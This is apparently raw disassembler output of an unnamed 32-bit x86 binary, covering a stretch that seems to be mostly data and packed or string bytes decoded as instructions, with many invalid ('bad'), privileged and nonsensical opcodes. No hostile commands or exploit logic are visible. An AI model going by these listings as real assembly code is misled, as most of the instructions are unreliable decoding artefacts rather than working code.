  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	sbb    ebx,DWORD PTR [eax-0x2e2311c2]
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	addr16 pop esp
  413f0e:	or     bl,BYTE PTR ds:0x862001b7
  413f14:	pop    ebx
  413f15:	xor    DWORD PTR [ebp+0x69941ff2],eax
  413f1b:	xchg   ecx,eax
  413f1c:	xchg   BYTE PTR [esi+0x49],bh
  413f1f:	mov    ecx,0xfd1ea45e
  413f24:	pop    ecx
  413f25:	aam    0xc8
  413f27:	aam    0x5f
  413f29:	mov    ah,0x99
  413f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2c:	rcr    DWORD PTR [edi-0x75],cl
  413f2f:	jbe    0x413f8c
  413f31:	mov    ah,0xf6
  413f33:	inc    esp
  413f34:	imul   esp,ebp,0x66
  413f37:	ja     0x413f27
  413f39:	pop    esi
  413f3a:	or     BYTE PTR [eax+0x2866fb9b],0x5b
  413f41:	(bad)  
  413f42:	outs   dx,BYTE PTR ds:[esi]
  413f43:	jl     0x413f3b
  413f45:	ins    DWORD PTR es:[edi],dx
  413f46:	adc    DWORD PTR [esi+0x21],ebp
  413f49:	add    DWORD PTR [esp+edi*4],ebx
  413f4c:	test   DWORD PTR [ebx-0x7dd08a5e],esp
  413f52:	(bad)  
  413f54:	adc    DWORD PTR [ebx+esi*1+0x1a05aea9],edi
  413f5b:	dec    ecx
  413f5c:	mov    edx,0x99b5739d
  413f61:	js     0x413eea
  413f63:	(bad)  
  413f64:	std    
  413f65:	sbb    edi,edi
  413f67:	add    DWORD PTR [ecx-0x3ea6c055],ebp
  413f6d:	add    al,0x6d
  413f6f:	mov    ebp,0x750e5ea7
  413f74:	enter  0x1964,0xfe
  413f78:	(bad)  
  413f79:	in     eax,0x7d
  413f7b:	dec    esi
  413f7c:	(bad)  
  413f7d:	lock imul edx,DWORD PTR [ecx+edi*2-0x3f],0x300e4562
  413f86:	cli    
  413f87:	xchg   edi,eax
  413f88:	ret    
  413f89:	(bad)  
  413f8a:	stc    
  413f8b:	xlat   BYTE PTR ds:[ebx]
  413f8c:	xchg   esp,eax
  413f8d:	and    bl,al
  413f8f:	pushf  
  413f90:	pop    ss
  413f91:	lods   eax,DWORD PTR ds:[esi]
  413f92:	int    0x91
  413f94:	jne    0x413fae
  413f96:	push   ds
  413f97:	rcr    edi,0xec
  413f9a:	ss push esp
  413f9c:	mov    eax,0x47bf5d6e
  413fa1:	mov    eax,ds:0x5c623f2f
  413fa6:	ret    
  413fa7:	aad    0x75
  413fa9:	loop   0x413fd1
  413fab:	lods   eax,DWORD PTR ds:[esi]
  413fac:	or     al,0xed
  413fae:	push   edx
  413faf:	sahf   
  413fb0:	dec    edx
  413fb1:	mov    edx,0x7bd03323
  413fb6:	push   ecx
  413fb7:	jo     0x414005
  413fb9:	popf   
  413fba:	and    bl,dh
  413fbc:	mov    BYTE PTR [ebp+0x33fd6009],bh
  413fc2:	icebp  
  413fc3:	xchg   edx,eax
  413fc4:	int3   
  413fc5:	fisubr WORD PTR [ebx]
  413fc7:	xor    ebx,DWORD PTR [esi-0x73]
  413fca:	cld    
  413fcb:	(bad)  
  413fcc:	not    BYTE PTR [edi+eiz*8+0x219a3af6]
  413fd3:	inc    ebx
  413fd4:	fisub  WORD PTR [edi-0x15]
  413fd7:	xchg   ebx,eax
  413fd8:	adc    eax,0xa946065
  413fdd:	aad    0x19
  413fdf:	mov    WORD PTR [ecx-0x7e],gs
  413fe2:	and    DWORD PTR [edx+ebx*4-0x21f41b40],ecx
  413fe9:	add    edx,edx
  413feb:	jno    0x413fe2
  413fed:	mov    bh,0xfe
  413fef:	sub    eax,0x331c7528
  413ff4:	test   BYTE PTR [edi+ecx*8],bh
  413ff7:	xchg   esi,eax
  413ff8:	(bad)  
  413ff9:	call   0xde02:0x9d87ef05
  414000:	mov    edx,0xe1861a30
  414005:	mov    ah,0x3e
  414007:	ret    
  414008:	fdivrp st(6),st
  41400a:	lock xlat BYTE PTR ds:[ebx]
  41400c:	push   edx
  41400d:	nop
  41400e:	sub    ecx,0x0
	...
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x496e:0xe0d52e96
  414083:	and    eax,0x40000d2
  414089:	add    DWORD PTR [eax],eax
  41408b:	add    bh,al
  41408d:	add    DWORD PTR [ecx-0x18e6b13e],esi
  414093:	ins    BYTE PTR es:[edi],dx
  414094:	cmp    ebp,ebx
  414096:	jb     0x4140ef
  414098:	pop    ebx
  414099:	xchg   ebp,eax
  41409a:	cmp    BYTE PTR [ebx+ebp*2],bh
  41409d:	mov    al,0xf3
  41409f:	jg     0x41406b
  4140a1:	lahf   
  4140a2:	fsub   st(3),st
  4140a4:	dec    ebp
  4140a5:	test   BYTE PTR [edx-0x4139972],ch
  4140ab:	pop    edi
  4140ac:	psrld  mm1,QWORD PTR ds:0xe2375ebb
  4140b3:	cmp    DWORD PTR [edi-0x1d45e8f2],ebx
  4140b9:	mov    eax,0x30af6e5
  4140be:	add    ah,dh
  4140c0:	mov    ah,0x81
  4140c2:	sbb    BYTE PTR [ebp-0x2c33e31d],bl
  4140c8:	in     eax,0xe3
  4140ca:	pop    ecx
  4140cb:	stos   DWORD PTR es:[edi],eax
  4140cc:	imul   esi,DWORD PTR [ebp+0x19],0xc70ba163
  4140d3:	mov    ds:0x93412e14,eax
  4140d8:	dec    ebp
  4140d9:	push   eax
  4140da:	add    DWORD PTR [ecx-0x78],ecx
  4140dd:	fwait
  4140de:	bound  esp,QWORD PTR [ebx-0x71]
  4140e1:	xchg   edi,eax
  4140e2:	gs loope 0x414140
  4140e5:	repz stc 
  4140e7:	fist   DWORD PTR [esi]
  4140e9:	cmp    eax,DWORD PTR [esi-0x73]
  4140ec:	std    
  4140ed:	push   esi
  4140ee:	call   0x8f3c90f8
  4140f3:	push   es
  4140f4:	pop    ecx
  4140f5:	fcomp  DWORD PTR [ebx]
  4140f7:	outs   dx,DWORD PTR ds:[esi]
  4140f8:	jnp    0x4140d4
  4140fa:	dec    edi
  4140fb:	ficomp WORD PTR [edx]
  4140fd:	adc    al,0x49
  4140ff:	push   ecx
  414100:	mov    al,0x6e
  414102:	repz cdq 
  414104:	or     BYTE PTR [ebx+0x5fb75e39],ah
  41410a:	cmp    BYTE PTR [edi-0x3d3317ea],0x35
  414111:	cdq    
  414112:	push   es
  414113:	outs   dx,DWORD PTR ds:[esi]
  414114:	and    BYTE PTR es:[ebp-0x73],cl
  414118:	cmp    al,0x6a
  41411a:	loop   0x41417b
  41411c:	add    eax,0x6b
  41411f:	ficomp WORD PTR [esi]
  414121:	pop    ecx
  414122:	cli    
  414123:	jmp    FWORD PTR [edi-0x3c334f2a]
  414129:	inc    ecx
  41412a:	add    DWORD PTR [esi+0x25],edi
  41412d:	push   ds
  41412e:	and    esi,ecx
  414130:	mov    edi,DWORD PTR [ebx-0x5]
  414133:	jle    0x414154
  414135:	(bad)  
  414136:	lahf   
  414137:	jg     0x4141a9
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	outs   dx,DWORD PTR ds:[esi]
  41413b:	daa    
  41413c:	xchg   DWORD PTR [ebx-0x28e9d391],eax
  414142:	inc    esi
  414143:	scas   al,BYTE PTR es:[edi]
  414144:	pop    ebp
  414145:	jl     0x414147
  414147:	cdq    
  414148:	inc    DWORD PTR [ebx+ebx*1]
  41414b:	mov    bh,0x58
  41414d:	push   ebp
  41414e:	push   0x30766cbe
  414153:	stc    
  414154:	bnd jb 0x414139
  414157:	(bad)  
  414159:	arpl   WORD PTR [ebp*4-0x42bfdb],sp
  414160:	lahf   
  414161:	scas   eax,DWORD PTR es:[edi]
  414162:	inc    edx
  414163:	xchg   edx,eax
  414164:	nop
  414165:	fisub  DWORD PTR [edi+0x78]
  414168:	push   ss
  414169:	mov    ?,WORD PTR [esi-0x63b8eb3e]
  41416f:	cs push esi
  414171:	sar    bh,cl
  414173:	ret    0x1c6f
  414176:	mov    ds:0xab56c202,al
  41417b:	xor    cl,bh
  41417d:	test   eax,0xad3aa960
  414182:	dec    ebx
  414183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414184:	pushf  
  414185:	mov    bh,0xb1
  414187:	in     al,0x75
  414189:	inc    sp
  41418b:	shl    dl,0x57
  41418e:	lods   eax,DWORD PTR ds:[esi]
  41418f:	fadd   DWORD PTR [eax]
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	(bad)  
  414201:	or     BYTE PTR [edi+0x8],bl
  414204:	in     al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	pop    ecx
  41420d:	mov    dl,0xf
  41420f:	test   al,0xf4
  414211:	pop    edx
  414212:	inc    edi
  414213:	std    
  414214:	mov    al,0x2a
  414216:	(bad)  
  414217:	and    edx,ebp
  414219:	cwde   
  41421a:	xchg   esi,eax
  41421b:	jmp    0xcd231f90
  414220:	xchg   ebp,eax
  414221:	adc    ebx,DWORD PTR [esi]
  414223:	rcl    DWORD PTR [ebx],0x77
  414226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414227:	jl     0x41426b
  414229:	pushf  
  41422a:	icebp  
  41422b:	xor    BYTE PTR [esi+0x66bd5a60],bl
  414231:	mov    cl,0xbb
  414233:	arpl   WORD PTR [eax+0x3f],di
  414236:	(bad)  
  414237:	sbb    esi,DWORD PTR [ecx+0x235827c]
  41423d:	jno    0x4141c8
  41423f:	mov    dh,0xf4
  414241:	shr    DWORD PTR [edx-0xf],1
  414244:	jns    0x414264
  414246:	(bad)  
  414247:	mov    ds:0x2e2e5c48,eax
  41424c:	inc    edx
  41424d:	or     DWORD PTR [ebx-0x1e054a3f],ebx
  414253:	fisub  WORD PTR [ecx+0x52]
  414256:	add    ecx,DWORD PTR [edx+eax*1+0x48]
  41425a:	xor    al,0x9b
  41425c:	dec    edx
  41425d:	test   al,0x3b
  41425f:	leave  
  414260:	shl    DWORD PTR [edx],cl
  414262:	jge    0x4142a7
  414264:	mov    eax,0x520507e8
  414269:	mov    dh,0x5
  41426b:	mov    ds:0xa86d1060,eax
  414270:	leave  
  414271:	jbe    0x414221
  414273:	mov    dl,0xb2
  414275:	stos   DWORD PTR es:[edi],eax
  414276:	pop    ecx
  414277:	fild   WORD PTR [eax]
  414279:	scas   eax,DWORD PTR es:[edi]
  41427a:	mov    BYTE PTR [ebp+0x3b],bh
  41427d:	mov    dh,0x5e
  41427f:	and    al,0xef
  414281:	or     BYTE PTR [ebp-0x5e6bec00],bl
  414287:	(bad)  
  414288:	xor    eax,0x31496e88
  41428d:	ins    BYTE PTR es:[edi],dx
  41428e:	xor    DWORD PTR [ebx-0x1a570370],eax
  414294:	ss push es
  414296:	add    al,0xcc
  414298:	aad    0x4b
  41429a:	(bad)  
  41429b:	in     eax,dx
  41429c:	addr16 push ss
  41429e:	aaa    
  41429f:	adc    esi,DWORD PTR [edx+ebp*4-0x7c]
  4142a3:	ds xchg esp,eax
  4142a5:	adc    dh,BYTE PTR [eax+0x749db6e8]
  4142ab:	not    BYTE PTR [ebx-0x78]
  4142ae:	or     bh,BYTE PTR [esi-0x1ae80f6f]
  4142b4:	or     bl,BYTE PTR [esi]
  4142b6:	jns    0x414302
  4142b8:	mov    eax,edi
  4142ba:	push   cs
  4142bb:	ds mov esp,0xffe46e52
  4142c1:	cmp    DWORD PTR [ebp+0x2a],eax
  4142c4:	or     DWORD PTR [ecx],ebp
  4142c6:	mov    ecx,0x9cba752d
  4142cb:	or     al,0x7f
  4142cd:	mov    ecx,0xb79bef3a
  4142d2:	mov    ah,0x64
  4142d4:	scas   eax,DWORD PTR es:[edi]
  4142d5:	lds    ebx,FWORD PTR [edi+0x78]
  4142d8:	push   eax
  4142d9:	or     DWORD PTR [ebx+0x3d],ecx
  4142dc:	sub    dl,BYTE PTR [eax-0x2b7c7ab3]
  4142e2:	dec    esp
  4142e3:	fisubr DWORD PTR [esi+0x4f]
  4142e6:	push   ss
  4142e7:	jle    0x4142d6
  4142e9:	dec    ecx
  4142ea:	pop    eax
  4142eb:	sbb    eax,0x6a1c8316
  4142f0:	lods   eax,DWORD PTR ds:[esi]
  4142f1:	fwait
  4142f2:	mov    edi,0x40445ced
  4142f7:	scas   eax,DWORD PTR es:[edi]
  4142f8:	inc    ebx
  4142f9:	inc    ebp
  4142fa:	adc    ebx,ebx
  4142fc:	mov    ecx,0xc62c3285
  414301:	popf   
  414302:	je     0x4142a8
  414304:	in     eax,dx
  414305:	daa    
  414306:	inc    edi
  414308:	xchg   esp,eax
  414309:	popf   
  41430a:	adc    eax,0xba1e248d
  41430f:	jmp    0x414311
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	push   ecx
  414381:	in     al,dx
  414382:	fwait
  414383:	jno    0x41436d
  414385:	aam    0x0
  414387:	add    BYTE PTR [ecx+eax*1],al
  41438a:	add    BYTE PTR [eax],al
  41438c:	sbb    al,0x95
  41438e:	pop    ds
  41438f:	add    DWORD PTR [ecx],edi
  414391:	jae    0x414390
  414393:	aad    0xd1
  414395:	popf   
  414396:	imul   esp,DWORD PTR [ecx],0xab99f0c7
  41439c:	scas   eax,DWORD PTR es:[edi]
  41439d:	mov    ss,edx
  41439f:	mov    esi,edi
  4143a1:	shl    dl,cl
  4143a3:	std    
